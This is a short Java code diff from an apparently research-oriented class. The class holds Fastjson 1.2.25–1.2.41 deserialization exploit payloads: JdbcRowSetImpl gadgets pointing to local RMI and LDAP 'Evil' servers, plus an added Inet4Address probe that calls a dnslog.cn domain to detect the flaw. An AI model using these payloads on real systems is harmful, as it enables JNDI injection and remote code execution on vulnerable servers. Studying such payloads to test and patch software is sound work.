@@ -11,6 +11,8 @@ public class FastJson1_2_25to41 {
         String payloadRmi = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Evil\", \"autoCommit\":true}";
         String payloadLdap = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Evil\", \"autoCommit\":true}";
 
-        JSON.parse(payloadRmi);
+        String payloaddetack = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"ynninb.dnslog.cn\n\"}";
+
+        JSON.parse(payloaddetack);
     }
 }
